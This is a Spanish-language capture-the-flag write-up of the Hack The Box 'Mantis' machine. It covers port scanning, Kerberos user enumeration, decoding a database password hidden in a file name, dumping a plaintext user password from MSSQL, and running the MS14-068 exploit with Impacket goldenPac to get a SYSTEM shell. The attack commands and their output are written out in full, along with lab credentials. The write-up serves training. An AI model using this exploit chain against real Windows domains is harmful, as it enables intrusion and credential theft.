# Enumeration

> Realizamos un escaneo de puertos en la máquina víctima para ver posibles vectores de entrada, para ello empleamos mi script automático de escaneo de puertos TCP o podemos emplear la herramienta nmap:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ sudo AutoNmap.sh 10.129.206.169 
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49167,49170,49179,50255
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-07 19:14:39Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.129.206.169:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-04-07T19:15:44+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.206.169:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-04-07T19:05:39
| Not valid after:  2055-04-07T19:05:39
| MD5:   895e:52c5:5948:68e9:39b3:4b30:9db4:23a1
|_SHA-1: 7966:e0f6:22cc:45e0:b195:71f8:5d44:4ca7:7489:5d24
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Tossed Salad - Blog
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
49170/tcp open  msrpc        Microsoft Windows RPC
49179/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.129.206.169:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-04-07T19:05:39
| Not valid after:  2055-04-07T19:05:39
| MD5:   895e:52c5:5948:68e9:39b3:4b30:9db4:23a1
|_SHA-1: 7966:e0f6:22cc:45e0:b195:71f8:5d44:4ca7:7489:5d24
| ms-sql-ntlm-info: 
|   10.129.206.169:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
|_ssl-date: 2025-04-07T19:15:44+00:00; +1s from scanner time.
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-04-07T19:15:36
|_  start_date: 2025-04-07T19:05:32
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
|_clock-skew: mean: 34m18s, deviation: 1h30m44s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2025-04-07T15:15:38-04:00
```

> Enumeramos su versión de Windows y dominio empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ crackmapexec smb 10.129.206.169                                                 
SMB         10.129.206.169  445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
```

> Añadimos el nombre de dominio y el FQDN de la máquina víctima al /etc/hosts para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ echo '10.129.206.169 htb.local MANTIS.htb.local' >> /etc/hosts
```

>Login anónimo fallido al listar recursos compartidos por SMB:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ smbclient -L \\\\10.129.206.169\\ -U ""
Password for [WORKGROUP\]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

> Ocurre lo mismo para el login anónimo a RPC:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ rpcclient -U "" -N 10.129.206.169
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

>Vamos a hacer una enumeración de usuarios del dominio mediante kerbrute:

```bash
┌──(kali㉿jbkira)-[~]
└─$ kerbrute userenum --dc 10.129.206.169 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -d htb.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/07/25 - Ronnie Flathers @ropnop

2025/04/07 15:30:59 >  Using KDC(s):
2025/04/07 15:30:59 >   10.129.206.169:88

2025/04/07 15:30:59 >  [+] VALID USERNAME:       james@htb.local
2025/04/07 15:31:02 >  [+] VALID USERNAME:       James@htb.local
2025/04/07 15:31:15 >  [+] VALID USERNAME:       administrator@htb.local
2025/04/07 15:31:32 >  [+] VALID USERNAME:       mantis@htb.local
2025/04/07 15:32:03 >  [+] VALID USERNAME:       JAMES@htb.local
```

>Si accedemos al servicio web en el puerto 8080 podemos ver lo siguiente:

![image](https://github.com/user-attachments/assets/b854f779-1ce6-4afb-be60-ad9f19fd7aad)

> En el servicio web del puerto 1337 está una página por defecto de IIS, vamos a hacerle un fuzz y vemos un directorio interesante:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.129.206.169:1337/FUZZ -c -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.206.169:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

<SNIP>
orchard                 [Status: 500, Size: 3026, Words: 683, Lines: 73, Duration: 70ms]
                        [Status: 200, Size: 689, Words: 25, Lines: 32, Duration: 65ms]
secure_notes            [Status: 301, Size: 163, Words: 9, Lines: 2, Duration: 75ms]
```

>En la siguiente url vemos el siguiente archivo http://10.129.206.169:1337/secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt:

```bash
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

> En la url vemos una string que probablemente esté en base64 por lo que vamos a decodearla:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo 'NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx' | base64 -d; echo
6d2424716c5f53405f504073735730726421
```

> Esta cadena resultante vamos a tratar de decodearla en hexadecimal y veremos que son las credenciales del usuario "admin" del Microsoft SQL Server:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo '6d2424716c5f53405f504073735730726421' | xxd -r -p
m$$ql_S@_P@ssW0rd!
```

> Nos conectaremos al servidor mediante la herramienta mssqlclient de la suite de Impacket:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-mssqlclient 'admin:m$$ql_S@_P@ssW0rd!@10.129.206.169'              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL (admin  admin@master)> 

```

> Vamos a enumerar las bases de datos disponibles:

```SQL
SQL (admin  admin@master)> SELECT name from master.dbo.sysdatabases
name        
---------   
master      

tempdb      

model       

msdb        

orcharddb
```

>Nos conectaremos a la que se llama orcharddb:

```sql
SQL (admin  admin@master)> USE orcharddb
ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.
```

> Enumeramos las tablas de la base de datos:

```sql
SQL (admin  admin@orcharddb)> SELECT table_name FROM orcharddb.INFORMATION_SCHEMA.TABLES
table_name                                             
----------------------------------------------------   
<SNIP>           

blog_Orchard_Users_UserPartRecord                      

<SNIP>
```

> Vamos a enumerar los registros de la tabla de usuarios que es la más interesante, donde podemos ver la contraseña del usuario James:

```sql
SQL (admin  admin@orcharddb)> select * from blog_Orchard_Users_UserPartRecord
Id   UserName   Email             NormalizedUserName   Password                                                               PasswordFormat   HashAlgorithm   PasswordSalt               RegistrationStatus   EmailStatus   EmailChallengeToken   CreatedUtc            LastLoginUtc          LastLogoutUtc         
--   --------   ---------------   ------------------   --------------------------------------------------------------------   --------------   -------------   ------------------------   ------------------   -----------   -------------------   -------------------   -------------------   -------------------   
 2   admin                        admin                AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   Hashed           PBKDF2          UBwWF1CQCsaGc/P7jIR/kg==   Approved             Approved      NULL                  2017-09-01 13:44:01   2017-09-01 14:03:50   2017-09-01 14:06:31   

15   James      james@htb.local   james                J@m3s_P@ssW0rd!                                                        Plaintext        Plaintext       NA                         Approved             Approved      NULL                  2017-09-01 13:45:44   NULL                  NULL  
```

> Vamos a comprobar si las credenciales son válidas en el servidor, por lo que podemos ver, son válidas:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.206.169 -u "James" -p 'J@m3s_P@ssW0rd!'
SMB         10.129.206.169  445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.206.169  445    MANTIS           [+] htb.local\James:J@m3s_P@ssW0rd!
```

# Privilege Escalation

> Vamos a explotar una vulnerabilidad de kerberos que posee esta máquina, en concreto la MS14-068, para ello, primero prepararemos la máquina:

```bash
sudo apt-get install krb5-user cifs-utils
```

> Establecemos los nombres de dominio para el resolutor local /etc/hosts:

```bash
10.129.206.169 mantis.htb.local mantis
```

> Añadimos la máquina víctima como servidor DNS en /etc/resolv.conf: 

```bash
nameserver 10.129.206.169
```

> Configuramos el archivo /etc/krb5.conf:

```bash
libdefaults]
    default_realm = HTB.LOCAL

[realms]
    HTB.LOCAL = {
        kdc = MANTIS.HTB.LOCAL:88
        admin_serve = MANTIS.HTB.LOCAL
        default_domain = HTB.LOCAL
    }
[domain_realm]
    .htb.local = HTB.LOCAL
    htb.local = HTB.LOCAL
```

>Aquí la máquina crasheó por lo que la dirección IP de la máquina víctima pasa a ser la "10.129.182.118".

> Nos sincronizamos con el servidor mediante NTP:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo ntpdate 10.129.182.118
2025-04-07 16:27:57.859074 (-0400) +1.014609 +/- 0.048298 10.129.182.118 s1 no-leap
CLOCK: time stepped by 1.014609
```

> Iniciamos el ticket:

```bash
┌──(kali㉿jbkira)-[~]
└─$ kinit james
Password for james@HTB.LOCAL: 
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~]
└─$ klist      
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: james@HTB.LOCAL

Valid starting       Expires              Service principal
04/07/2025 16:36:13  04/08/2025 02:36:13  krbtgt/HTB.LOCAL@HTB.LOCAL
        renew until 04/08/2025 16:36:07
```

> Obtenemos el SSID de James:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "James" 10.129.182.118            
Password for [WORKGROUP\James]:
rpcclient $> lookupnames james
james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
```

> Obtenemos el exploit:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ searchsploit -m 35474                                                                          
  Exploit: Microsoft Windows Kerberos - Privilege Escalation (MS14-068)
      URL: https://www.exploit-db.com/exploits/35474
     Path: /usr/share/exploitdb/exploits/windows/remote/35474.py
    Codes: CVE-2014-6324, OSVDB-114751, MS14-068
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/Desktop/machines/mantis/35474.py


                                                                                                                                                                    
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ mv 35474.py ms14-068.py  
```

> Lo ejecutamos: 

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ python ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
Password: 
  [+] Building AS-REQ for mantis.htb.local... Done!
  [+] Sending AS-REQ to mantis.htb.local... Done!
  [+] Receiving AS-REP from mantis.htb.local... Done!
  [+] Parsing AS-REP from mantis.htb.local... Done!
  [+] Building TGS-REQ for mantis.htb.local... Done!
  [+] Sending TGS-REQ to mantis.htb.local... Done!
  [+] Receiving TGS-REP from mantis.htb.local... Done!
  [+] Parsing TGS-REP from mantis.htb.local... Done!
  [+] Creating ccache file 'TGT_james@htb.local.ccache'... Done!
```

> Lo copiamos a /tmp el archivo generado:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mantis]
└─$ cp TGT_james@htb.local.ccache /tmp/krb5cc_0
```

> Ejecutamos goldenPac.py de la suite de Impacket y ganamos una shell como SYSTEM:

```bash
goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<SNIP>

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

> Al tener una shell como system podemos obtener ambas flags, la primera en C:\Users\James\Desktop\user.txt y la segunda en C:\Users\Administrator\Desktop\root.txt
